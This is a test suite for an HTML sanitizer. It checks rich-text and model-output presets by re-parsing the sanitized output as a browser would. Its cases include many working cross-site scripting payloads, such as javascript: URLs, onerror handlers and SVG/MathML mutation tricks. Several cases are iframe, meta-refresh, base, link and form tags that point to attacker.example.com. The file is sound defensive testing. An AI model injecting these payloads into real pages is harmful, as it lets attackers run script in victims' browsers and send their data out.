// The sanitizers against malformed and hostile markup. Every case checks the
// output the way a browser would read it: parse it again as HTML and walk the
// tree, so an element or attribute that only appears after a second parse
// still fails the test.

import { type DefaultTreeAdapterTypes, parse } from "parse5";
import { describe, expect, it } from "vitest";
import {
  ALLOWED_TAGS,
  ATTR_ALLOW,
  MODEL_ALLOWED_TAGS,
  MODEL_ATTR_ALLOW,
  MODEL_LINK_REL,
  sanitizeModelHtml,
  sanitizeRichHtml,
} from "../../src/core/security/index.js";

type Node = DefaultTreeAdapterTypes.ChildNode;
type Element = DefaultTreeAdapterTypes.Element;

const HTML_NS = "http://www.w3.org/1999/xhtml";
const SAFE_URL = /^(?:https?:|mailto:|\/|#|\.)/i;
const MODEL_SAFE_URL = /^(?:https?:|mailto:)/i;

interface Preset {
  name: string;
  run: (html: string) => string;
  tags: readonly string[];
  attrs: Record<string, Set<string>>;
  url: RegExp;
}

const PRESETS: Preset[] = [
  {
    name: "rich",
    run: (h) => sanitizeRichHtml(h),
    tags: ALLOWED_TAGS,
    attrs: ATTR_ALLOW,
    url: SAFE_URL,
  },
  {
    name: "rich with mediaBase",
    run: (h) => sanitizeRichHtml(h, { mediaBase: "/media" }),
    tags: ALLOWED_TAGS,
    attrs: ATTR_ALLOW,
    url: SAFE_URL,
  },
  {
    name: "model",
    run: sanitizeModelHtml,
    tags: MODEL_ALLOWED_TAGS,
    // The model preset writes `rel` itself.
    attrs: { a: new Set([...(MODEL_ATTR_ALLOW.a ?? []), "rel"]) },
    url: MODEL_SAFE_URL,
  },
];

/** Every problem a browser would find in `out` when it renders it in a body. */
function violations(out: string, preset: Preset): string[] {
  const found: string[] = [];
  const doc = parse(`<!DOCTYPE html><body>${out}`);
  const root = doc.childNodes.find((n): n is Element => n.nodeName === "html")!;
  const body = root.childNodes.find((n): n is Element => n.nodeName === "body")!;
  const stack: Node[] = [...body.childNodes];
  while (stack.length > 0) {
    const node = stack.pop()!;
    if (node.nodeName === "#comment") found.push("comment");
    if (!("tagName" in node)) continue;
    if (node.namespaceURI !== HTML_NS) found.push(`foreign <${node.tagName}>`);
    if (!preset.tags.includes(node.tagName)) found.push(`<${node.tagName}>`);
    for (const { name, value } of node.attrs) {
      if (!preset.attrs[node.tagName]?.has(name)) found.push(`${node.tagName}[${name}]`);
      if ((name === "href" || name === "src") && !preset.url.test(value.trim())) {
        found.push(`${node.tagName}[${name}=${value}]`);
      }
      if (name === "style" && !/^\s*(?:color|grid-template-columns):[^;]*;?\s*$/i.test(value)) {
        found.push(`${node.tagName}[style=${value}]`);
      }
    }
    stack.push(...node.childNodes);
  }
  return found;
}

/** Runs `html` through every preset and asserts the output is clean. */
function expectSafe(html: string): void {
  for (const preset of PRESETS) {
    let out = "";
    expect(
      () => {
        out = preset.run(html);
      },
      `${preset.name} threw on ${JSON.stringify(html)}`,
    ).not.toThrow();
    expect(violations(out, preset), `${preset.name}: ${JSON.stringify(html)} -> ${out}`).toEqual(
      [],
    );
    // The output never spells a blocked tag, even as text a later step could
    // misread: text is escaped, so a `<` only ever opens an allowed tag.
    expect(out).not.toMatch(
      /<\/?(?:script|style|iframe|object|embed|form|meta|link|base|svg|math)\b/i,
    );
  }
}

describe("sanitizer hardening", () => {
  describe("markup the tokenizer reads differently", () => {
    it("parses a slash between a tag name and its attributes as a browser does", () => {
      const img = "<p><img/src=x onerror=alert(1)></p>";
      expect(sanitizeRichHtml(img)).toBe("<p><img></p>");
      expect(sanitizeRichHtml(img, { mediaBase: "/media" })).toBe("<p></p>");
      expect(sanitizeModelHtml(img)).toBe("<p></p>");

      const link = "<a/href=javascript:alert(1)>x</a>";
      expect(sanitizeRichHtml(link)).toBe("<a>x</a>");
      expect(sanitizeModelHtml(link)).toBe("x");
      expectSafe(img);
      expectSafe(link);
    });

    it("keeps a quote inside an attribute value from closing the value", () => {
      const out = sanitizeRichHtml(`<a href='/x" style="position:fixed;inset:0'>y</a>`);
      expect(out).toBe('<a href="/x&quot; style=&quot;position:fixed;inset:0">y</a>');
      expectSafe(`<a href='/x" style="position:fixed;inset:0'>y</a>`);
      expectSafe(`<img src='/media/x.png" onerror="alert(1)' alt='a"b'>`);
    });

    it("can't rebuild a blocked tag out of the pieces around a removed one", () => {
      for (const html of [
        "<scr<link/x>ipt>alert(1)</scr<link/x>ipt>",
        "<scr<script>x</script>ipt>alert(1)</script>",
        "<ifr<link/x>ame src=https://attacker.example.com></ifr<link/x>ame>",
        "<me<link/x>ta http-equiv=refresh content=0;url=https://attacker.example.com>",
        "<<script>script>alert(1)<</script>/script>",
      ]) {
        expectSafe(html);
      }
      // `scr<link` is one unknown tag name, so it goes with what follows it.
      expect(sanitizeRichHtml("<p>a<scr<link/x>ipt>b</p>")).toBe("<p>a</p>");
    });

    it("doesn't throw on a closing tag with no opener", () => {
      for (const html of [
        "</a>",
        "<a/href=x>x</a>",
        "</p></div></span>",
        "x</a>y",
        "</>",
        "<//a>",
      ]) {
        expectSafe(html);
      }
      expect(sanitizeRichHtml("x</a>y")).toBe("xy");
    });
  });

  describe("OWASP-style vectors", () => {
    const vectors = [
      "<script>alert(1)</script>",
      "<SCRIPT SRC=https://attacker.example.com/x.js></SCRIPT>",
      "<IMG SRC=\"javascript:alert('x');\">",
      "<IMG SRC=JaVaScRiPt:alert('x')>",
      "<IMG SRC=`javascript:alert(1)`>",
      '<IMG """><SCRIPT>alert("x")</SCRIPT>">',
      "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>",
      "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)>",
      '<IMG SRC="jav\tascript:alert(1);">',
      '<IMG SRC="jav&#x09;ascript:alert(1);">',
      '<IMG SRC=" &#14;  javascript:alert(1);">',
      '<a href="java&#0;script:alert(1)">x</a>',
      '<a href="javascript&colon;alert(1)">x</a>',
      '<a href="  JAVASCRIPT:alert(1)">x</a>',
      '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
      '<a href="vbscript:msgbox(1)">x</a>',
      "<svg/onload=alert(1)>",
      "<svg><script>alert(1)</script></svg>",
      "<svg><a href=javascript:alert(1)><text>x</text></a></svg>",
      "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
      "<math><mi><a href=javascript:alert(1)>x</a></mi></math>",
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
      '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
      "<template><script>alert(1)</script></template>",
      "<iframe src=https://attacker.example.com></iframe>",
      '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
      '<meta http-equiv="refresh" content="0;url=https://attacker.example.com">',
      '<base href="https://attacker.example.com/">',
      '<link rel="stylesheet" href="https://attacker.example.com/x.css">',
      "<style>@import url(https://attacker.example.com/x.css);</style>",
      '<object data="javascript:alert(1)"></object>',
      '<embed src="https://attacker.example.com/x.swf">',
      '<form action="https://attacker.example.com"><input name="q"><button>Go</button></form>',
      '<div style="background:url(javascript:alert(1))">x</div>',
      '<span style="color: red; background-image: url(https://attacker.example.com/p.gif)">x</span>',
      '<span style="color: expression(alert(1))">x</span>',
      '<span style="color:red\\;position:fixed">x</span>',
      '<div class="pb-x fixed inset-0" data-block="x" onmouseover="alert(1)">x</div>',
      '<p onclick="alert(1)" ONCLICK="alert(1)" OnClick=alert(1)>x</p>',
      '<a href="https://example.com" target="_blank" rel="opener">x</a>',
      "<details open ontoggle=alert(1)>",
      "<video><source onerror=alert(1)></video>",
      "<body onload=alert(1)>",
      "<frameset><frame src=javascript:alert(1)></frameset>",
      "<frameset onload=alert(1)>",
      "<!--<script>-->alert(1)<!--</script>-->",
      "<!-- --!><script>alert(1)</script> -->",
      "<![CDATA[<script>alert(1)</script>]]>",
      "<?xml version='1.0'?><script>alert(1)</script>",
      "<x-el onclick=alert(1)>custom</x-el>",
      "<textarea><script>alert(1)</script></textarea>",
      "<title><script>alert(1)</script></title>",
      "<xmp><script>alert(1)</script></xmp>",
      "<plaintext><script>alert(1)</script>",
      "<a href=https://example.com><a href=javascript:alert(1)>nested</a></a>",
      "<p><b><i>misnested</b></i></p>",
      "<table><tr><td><a href=javascript:alert(1)>x</a></td></tr></table>",
      "<table><p>foster<img src=x onerror=alert(1)></table>",
      "<select><option><img src=x onerror=alert(1)></option></select>",
      "<img src=/media/x.png alt='<script>alert(1)</script>'>",
      "<p>\u0000<scr\u0000ipt>alert(1)</script></p>",
      "<p>\ud800 lone surrogate</p>",
      '<p title="  ">x</p>',
    ];

    it.each(vectors)("%s", (html) => {
      expectSafe(html);
    });

    it("decodes an entity-encoded scheme before checking it", () => {
      expect(sanitizeRichHtml('<a href="javascript&colon;alert(1)">x</a>')).toBe("<a>x</a>");
      expect(sanitizeRichHtml('<a href="&#106;avascript:alert(1)">x</a>')).toBe("<a>x</a>");
    });

    it("escapes a tag-shaped attribute value", () => {
      expect(sanitizeRichHtml("<img src=/media/x.png alt='<b>'>")).toBe(
        '<img src="/media/x.png" alt="&lt;b&gt;">',
      );
    });

    it("drops a frameset that replaces the body", () => {
      expect(sanitizeRichHtml("<frameset><frame src=javascript:alert(1)></frameset>")).toBe("");
    });
  });

  describe("never throws", () => {
    it("returns escaped text for nesting deeper than any rich text", () => {
      const html = `${"<div>".repeat(5000)}x`;
      const out = sanitizeRichHtml(html);
      expect(out.startsWith("&lt;div&gt;")).toBe(true);
      expectSafe(html);
    });

    it("keeps nesting up to 256 elements deep", () => {
      const nest = (n: number) => `${"<div>".repeat(n)}x${"</div>".repeat(n)}`;
      expect(sanitizeRichHtml(nest(256))).toBe(nest(256));
      expect(sanitizeRichHtml(nest(257)).startsWith("&lt;div&gt;")).toBe(true);
    });

    it("can't reset the depth count by nesting templates", () => {
      expectSafe(`${"<template><div>".repeat(2000)}x`);
    });

    it("handles many top-level nodes in linear time", () => {
      // Compares sizes rather than a wall-clock bound, so a slow runner can't
      // fail it. Five times the nodes measures 6 to 9 times as long here, with
      // allocation overhead, and about 26 times with the quadratic fragment
      // parse this replaced. The best of three runs keeps a garbage-collection
      // pause out of the ratio.
      const fastest = (nodes: number) => {
        const html = "<li>a".repeat(nodes);
        let best = Infinity;
        for (let run = 0; run < 3; run++) {
          const start = performance.now();
          sanitizeRichHtml(html);
          best = Math.min(best, performance.now() - start);
        }
        return best;
      };
      fastest(10_000); // Warm up the JIT.
      const ratio = fastest(50_000) / fastest(10_000);
      expect(ratio).toBeLessThan(16);
    });

    it("treats a non-string as its string form", () => {
      expect(sanitizeRichHtml(undefined as unknown as string)).toBe("");
      expect(sanitizeModelHtml(null as unknown as string)).toBe("");
      expect(sanitizeRichHtml(42 as unknown as string)).toBe("42");
    });

    it("survives random markup soup", () => {
      // A fixed-seed generator, so a failure reproduces.
      let seed = 0x5eed;
      const rand = (n: number) => {
        seed = (seed * 1103515245 + 12345) & 0x7fffffff;
        return seed % n;
      };
      const pieces = [
        "<",
        ">",
        "</",
        "/>",
        "<a",
        "<img",
        "<script",
        "<style",
        "<svg",
        "<math",
        "<p",
        "<div",
        "<span",
        "<pre",
        "<!--",
        "-->",
        "<![CDATA[",
        "]]>",
        "=",
        '"',
        "'",
        "`",
        " ",
        "\n",
        "&",
        "&amp;",
        "&lt;",
        "&#",
        "x",
        ";",
        "href=",
        "src=",
        "style=",
        "onerror=",
        "javascript:",
        "https://example.com",
        "/media/x.png",
        "alert(1)",
        "</script>",
        "</a>",
        "</p>",
        "<li>",
        "<table>",
        "<td>",
        "<template>",
        "<noscript>",
        "<textarea>",
        "<title>",
        "\u0000",
        " ",
      ];
      for (let i = 0; i < 1500; i++) {
        let html = "";
        const len = 1 + rand(40);
        for (let j = 0; j < len; j++) html += pieces[rand(pieces.length)];
        expectSafe(html);
      }
    });
  });

  describe("round trips", () => {
    // What the editor writes comes back unchanged, so saving a page twice is a no-op.
    const editorHtml = [
      "<div><p>Hello <strong>world</strong> and <em>you</em>.</p></div>",
      "<div><h2>Menu</h2><ul><li>One</li><li>Two</li></ul><ol><li>a</li></ol></div>",
      '<div><p><a href="https://example.com/a?b=1&amp;c=2">link</a></p></div>',
      '<div><p><span style="color: #ff0000" data-text-color="red">red</span></p></div>',
      '<div><p><span style="color: var(--color-primary)" data-text-color="primary">x</span></p></div>',
      '<div><p><img src="/media/web/x.png" alt="A cup" width="300" height="200"></p></div>',
      "<div><p>Line<br>break</p><p></p><p><br></p></div>",
      "<div><blockquote><p>quoted</p></blockquote><pre><code>let x = 1;\nlet y = 2;</code></pre></div>",
      '<div><section data-block="grid" class="pb-grid" data-cols="3"><figure data-block="image" class="pb-figure"><img src="/media/a.png" alt=""><figcaption class="pb-caption">cap</figcaption></figure></section></div>',
      '<div data-block="row" class="pb-row" style="grid-template-columns: 6fr 4fr"><div data-block="col" class="pb-col"><p>a</p></div></div>',
      '<hr class="pb-divider" data-block="divider" data-size="lg">',
      "<div><p>Alex &amp; Kai &lt;3 5 &gt; 4</p></div>",
      "<div><p>a&nbsp;b&nbsp;&nbsp;c</p></div>",
      "<div><p>Café — “quoted” ’s \"plain\" 'single'</p></div>",
      '<div><p><span lang="fr">bonjour</span></p></div>',
      "<div><p><u>u</u> <s>s</s> <del>d</del> <b>b</b> <i>i</i> <strike>st</strike></p></div>",
      '<div><p><a href="mailto:alex@example.com">mail</a> <a href="#top">top</a> <a href="./x">rel</a></p></div>',
      '<div><p><img src="https://cdn.example.com/x.png" alt="a &quot;b&quot; c"></p></div>',
      "<div><pre>\n\nleading blank line</pre></div>",
      "plain text, no tags",
      "",
    ];

    it.each(editorHtml)("%s", (html) => {
      expect(sanitizeRichHtml(html)).toBe(html);
      // Idempotent: a second pass changes nothing.
      expect(sanitizeRichHtml(sanitizeRichHtml(html))).toBe(sanitizeRichHtml(html));
    });

    it("writes named and numeric character references as the characters they stand for", () => {
      expect(sanitizeRichHtml("<p>&quot;a&quot; &#39;b&#39; &mdash; &copy;</p>")).toBe(
        "<p>\"a\" 'b' — ©</p>",
      );
    });

    it("round-trips model output", () => {
      const html =
        "<h2>Summary</h2><p>Read <strong>this</strong> and " +
        `<a href="https://example.com" rel="${MODEL_LINK_REL}">that</a>.</p>` +
        "<ul><li>one</li><li><em>two</em></li></ul><blockquote><p>q &amp; a</p></blockquote>";
      expect(sanitizeModelHtml(html)).toBe(html);
    });
  });
});
